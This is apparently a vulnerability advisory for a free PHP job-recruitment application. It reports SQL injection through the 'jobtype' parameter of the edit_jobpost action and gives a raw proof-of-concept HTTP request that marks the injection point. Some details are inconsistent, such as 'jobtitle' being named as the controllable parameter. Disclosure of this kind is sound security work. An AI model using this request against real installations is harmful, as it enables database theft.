# job-recruitment-in-php has sql injection vulnerability in jobtype parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
jobtype parameter

## describe

The system there is sql inection vulnerability Via jobtype parameter .The parameters that can be controlled are as follows:  jobtitle parameter . A attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of   $jobtype = $_POST['jobtype']  is obtained in edit_jobpost action , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241226012118274](https://github.com/user-attachments/assets/423a6dec-37d3-4fec-b7f2-709f81f72b66)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

jid=1&degree=2&jobtitle=1&action=edit_jobpost&jobtype=1*&deadline=1
```

**Result**

![image-20241226012312634](https://github.com/user-attachments/assets/f3d005a0-cab4-468b-a629-7b637bfc3431)
